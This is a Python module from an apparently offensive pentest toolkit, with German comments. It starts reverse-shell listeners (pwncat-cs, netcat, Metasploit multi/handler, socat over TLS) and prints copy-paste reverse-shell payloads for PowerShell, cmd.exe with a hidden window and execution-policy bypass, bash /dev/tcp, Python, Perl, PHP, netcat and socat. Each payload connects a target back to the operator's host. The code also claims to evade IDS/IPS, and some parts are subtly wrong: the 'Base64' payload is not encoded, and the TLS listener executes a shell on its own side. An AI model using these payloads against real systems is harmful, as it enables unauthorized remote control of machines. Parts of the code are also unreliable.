"""
Reverse Shell Listener — empfängt eingehende Shells.

Unterstützt:
  1. pwncat-cs     — modernster Listener, Auto-Upgrade auf PTY, Datei-Transfer
  2. netcat (nc)   — klassisch, überall verfügbar
  3. msfconsole    — Meterpreter-Listener (multi/handler)
  4. socat         — stabile encrypted TLS-Shell

Zeigt auch ready-to-use Payload-Commands für PowerShell, bash, Python etc.
die der Operator auf das Ziel kopieren kann.
"""

from __future__ import annotations
import asyncio
import os
import socket
from typing import AsyncGenerator

from core.runner import CommandRunner

runner = CommandRunner()

# ── Payload-Templates ─────────────────────────────────────────────────────────

def _get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "KALI-IP"


def get_payload_commands(lhost: str, lport: int) -> dict[str, str]:
    """Gibt copy-paste Shell-Payloads für verschiedene Plattformen zurück."""
    return {
        "PowerShell (Windows)": (
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0)"
            f"{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}}"
        ),
        "PowerShell Base64": (
            "$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0)"
            "{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
            "$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}}"
        ).replace("{h}", lhost).replace("{p}", str(lport)),
        "cmd.exe (Windows)": (
            f"cmd /c start /min powershell -NoP -W Hidden -NonI -Exec Bypass "
            f"-c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0)"
            f"{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);"
            f"$s.Write($rb,0,$rb.Length)}}\""
        ),
        "Bash (Linux)": (
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ),
        "Python 3 (Linux/Windows)": (
            f"python3 -c \"import socket,subprocess,os;"
            f"s=socket.socket();s.connect(('{lhost}',{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call(['/bin/sh','-i'])\""
        ),
        "Perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        ),
        "PHP": (
            f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "Netcat": f"nc -e /bin/sh {lhost} {lport}",
        "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
    }


# ── Listener Klassen ──────────────────────────────────────────────────────────

class PwncatListener:
    """
    pwncat-cs Listener — modernster Reverse-Shell-Empfänger.

    Features:
    - Auto-Upgrade auf stabiles PTY
    - Eingebauter Datei-Upload/Download
    - Privilege Escalation via privesc module
    - Automatische Enumeration nach Connect
    """

    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
        self._proc = None

    async def listen(self) -> AsyncGenerator[str, None]:
        yield f"[*] pwncat-cs Listener auf {self.lhost}:{self.lport}..."
        yield "[*] pwncat bietet: Auto-PTY, Datei-Transfer, PrivEsc, Enumeration"
        yield "[*] Nach Connect: 'help' für alle Befehle"
        yield "─" * 60

        # pwncat interaktiv starten
        cmd = ["pwncat-cs", "-l", self.lhost, "-p", str(self.lport)]

        try:
            # pwncat läuft interaktiv — direkt in Terminal übergeben
            os.execvp("pwncat-cs", cmd)
        except FileNotFoundError:
            yield "[!] pwncat-cs nicht gefunden"
            yield "[*] Installieren: pip3 install pwncat-cs --break-system-packages"
            yield "[*] Fallback: netcat wird verwendet"
            async for line in NetcatListener(self.lhost, self.lport).listen():
                yield line


class NetcatListener:
    """Klassischer netcat Listener — überall verfügbar."""

    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
        self._proc = None

    async def listen(self) -> AsyncGenerator[str, None]:
        yield f"[*] netcat Listener auf 0.0.0.0:{self.lport}..."
        yield "[*] Warte auf eingehende Verbindung..."
        yield "─" * 60

        try:
            # nc -lvnp PORT
            os.execvp("nc", ["nc", "-lvnp", str(self.lport)])
        except FileNotFoundError:
            # Versuche ncat (nmap-Version)
            try:
                os.execvp("ncat", ["ncat", "-lvp", str(self.lport)])
            except FileNotFoundError:
                yield "[!] nc/ncat nicht gefunden: apt install netcat-openbsd"


class MsfListener:
    """Metasploit multi/handler — für Meterpreter Payloads."""

    def __init__(self, lhost: str, lport: int, payload: str = "windows/x64/meterpreter/reverse_tcp"):
        self.lhost = lhost
        self.lport = lport
        self.payload = payload

    async def listen(self) -> AsyncGenerator[str, None]:
        yield f"[*] Metasploit Handler auf {self.lhost}:{self.lport}..."
        yield f"[*] Payload: {self.payload}"
        yield "─" * 60

        rc_file = "/tmp/penkit_msf_handler.rc"
        with open(rc_file, "w") as f:
            f.write(f"""use exploit/multi/handler
set PAYLOAD {self.payload}
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j -z
""")

        yield f"[*] RC-Datei erstellt: {rc_file}"
        yield "[*] Starte msfconsole..."
        yield ""

        try:
            os.execvp("msfconsole", ["msfconsole", "-r", rc_file])
        except FileNotFoundError:
            yield "[!] msfconsole nicht gefunden: apt install metasploit-framework"


class SocatTLSListener:
    """
    socat TLS-Listener — verschlüsselte Shell, bypassed IDS/IPS.
    Erstellt selbst-signiertes Zertifikat und lauscht auf TLS.
    """

    def __init__(self, lport: int):
        self.lport = lport
        self.cert_path = "/tmp/penkit_shell.pem"

    async def listen(self) -> AsyncGenerator[str, None]:
        yield f"[*] socat TLS Listener auf Port {self.lport}..."

        # Zertifikat erstellen wenn nötig
        if not os.path.exists(self.cert_path):
            yield "[*] Erstelle TLS-Zertifikat..."
            async for line in runner.run([
                "openssl", "req", "-newkey", "rsa:2048", "-nodes",
                "-keyout", self.cert_path,
                "-x509", "-days", "365",
                "-out", self.cert_path,
                "-subj", "/CN=localhost",
            ]):
                pass
            yield f"[+] Zertifikat erstellt: {self.cert_path}"

        lhost = _get_local_ip()
        yield f"[*] Ziel-Payload (Linux): socat TCP:{lhost}:{self.lport},verify=0 EXEC:/bin/sh,pty,stderr,setsid"
        yield f"[*] Ziel-Payload (Windows): socat TCP:{lhost}:{self.lport},verify=0 EXEC:cmd.exe,pty,stderr"
        yield "[*] Warte auf Verbindung..."
        yield "─" * 60

        try:
            os.execvp("socat", [
                "socat",
                f"OPENSSL-LISTEN:{self.lport},cert={self.cert_path},verify=0,fork",
                "EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
            ])
        except FileNotFoundError:
            yield "[!] socat nicht gefunden: apt install socat"


async def show_payloads(lhost: str, lport: int) -> AsyncGenerator[str, None]:
    """Zeigt alle verfügbaren Payload-Commands zum Kopieren."""
    yield f"[*] Reverse-Shell Payloads für {lhost}:{lport}"
    yield "═" * 70
    payloads = get_payload_commands(lhost, lport)
    for name, cmd in payloads.items():
        yield f"\n  [{name}]"
        # Langen Command in Zeilen umbrechen
        if len(cmd) > 80:
            yield f"  {cmd[:80]}"
            yield f"  {cmd[80:]}"
        else:
            yield f"  {cmd}"
    yield ""
    yield "═" * 70
    yield "[*] Tipp: Payload auf Ziel ausführen → Listener empfängt Shell"
